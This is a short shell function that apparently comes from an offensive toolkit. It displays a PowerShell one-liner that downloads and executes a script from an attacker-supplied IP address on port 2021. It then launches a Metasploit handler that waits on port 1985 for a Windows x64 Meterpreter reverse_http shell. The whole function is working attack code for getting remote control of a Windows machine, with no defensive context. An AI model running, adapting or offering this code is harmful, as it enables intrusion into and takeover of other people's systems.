enterx64 () {
clear
    echo "

[$azu IEX (New-Object Net.WebClient).DownloadString
        ('http://$ip:2021/xx0')$fin]
   
    "
  msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/x64/meterpreter/reverse_http;set LPORT 1985;set LHOST $ip;exploit"
} 

